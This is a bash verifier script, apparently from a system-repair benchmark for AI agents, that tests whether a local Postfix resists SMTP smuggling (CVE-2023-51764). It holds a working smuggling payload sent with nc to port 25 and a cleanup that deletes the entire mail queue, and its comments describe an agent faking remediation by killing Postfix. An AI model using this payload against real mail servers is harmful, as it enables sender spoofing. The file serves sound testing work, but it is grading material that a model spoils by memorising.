#!/bin/bash
# Scenario 60: Postfix — SMTP Smuggling (CVE-2023-51764)
# LIVE exploit: a single SMTP transaction whose DATA is terminated by a BARE
# "<LF>.<LF>" instead of "<CR><LF>.<CR><LF>". A vulnerable Postfix treats the
# bare terminator as end-of-data and accepts the SMUGGLED second message that
# follows, so TWO messages queue from one payload. A remediated Postfix
# (smtpd_forbid_bare_newline=yes, exclusions emptied) queues only ONE.
# The verifier never starts Postfix — a dead service is a FAIL. It cleans up any
# queued test mail so it leaves the mail system as it found it.
set -u
[ -n "${_SYSREPAIR_VERIFYLIB_LOADED:-}" ] || . "${SYSREPAIR_VERIFYLIB:-/tmp/verifylib.sh}"

HOST=127.0.0.1
PORT=25

# Best-effort cleanup of the test messages this probe queues (leave the queue as
# we found it). postsuper -d ALL removes queue entries only.
cleanup() { postsuper -d ALL >/dev/null 2>&1 || true; }
trap cleanup EXIT INT TERM

# One SMTP session: message #1 ends with a BARE-LF dot; a smuggled message #2
# follows. Count "queued as" acknowledgements in the reply stream.
smuggle() {
    printf 'EHLO probe\r\nMAIL FROM:<a@localhost>\r\nRCPT TO:<root@localhost>\r\nDATA\r\nSubject: one\r\n\r\nbody\r\n.\nMAIL FROM:<smuggled@localhost>\r\nRCPT TO:<root@localhost>\r\nDATA\r\nSubject: two\r\n\r\nsmuggled\r\n.\r\nQUIT\r\n' \
        | timeout 15 nc -q3 "$HOST" "$PORT" 2>/dev/null
}

OUT=""
for i in 1 2 3 4 5; do
    OUT=$(smuggle)
    if printf '%s' "$OUT" | grep -q '^220 '; then break; fi
    sleep 2
done

###############################################################################
# Regression: Postfix must greet on :25.
###############################################################################
GREETED=0
printf '%s' "$OUT" | grep -q '^220 ' && GREETED=1

if [ "$GREETED" = "1" ]; then
    record_reg postfix_greets 1
else
    record_reg postfix_greets 0 "Postfix did not greet on port $PORT (service down / not started)"
fi

# `|| true`: grep -c exits 1 when it counts zero, and the assignment must not
# be allowed to abort the script before verify_finish runs.
QUEUED=$(printf '%s' "$OUT" | grep -c 'Ok: queued as' || true)
QUEUED=${QUEUED:-0}

###############################################################################
# PoC: one bare-LF payload must queue at most ONE message.
#
# The PoC is deliberately COUPLED TO REACHABILITY. With no SMTP greeting the
# smuggling probe never ran, so "only one message queued" is an artefact of a
# dead daemon rather than evidence of remediation; crediting it would let an
# agent close the vulnerability by killing Postfix. A silent server therefore
# fails the PoC instead of passing it.
###############################################################################
if [ "$GREETED" != "1" ]; then
    record_poc bare_lf_smuggling_blocked 0 \
        "no SMTP greeting, so the bare-LF smuggling probe could not be run — remediation is undemonstrated"
elif [ "$QUEUED" -ge 2 ]; then
    record_poc bare_lf_smuggling_blocked 0 \
        "SMTP smuggling succeeded — one bare-LF payload queued $QUEUED messages; set smtpd_forbid_bare_newline=yes, empty the exclusions and reload"
else
    record_poc bare_lf_smuggling_blocked 1 "payload queued only $QUEUED message"
fi

###############################################################################
# Regression: legitimate mail from loopback must still be accepted.
###############################################################################
if [ "$QUEUED" -lt 1 ]; then
    record_reg legit_mail_accepted 0 "Postfix accepted no message from loopback (over-blocked / broken / down)"
else
    record_reg legit_mail_accepted 1
fi

verify_finish
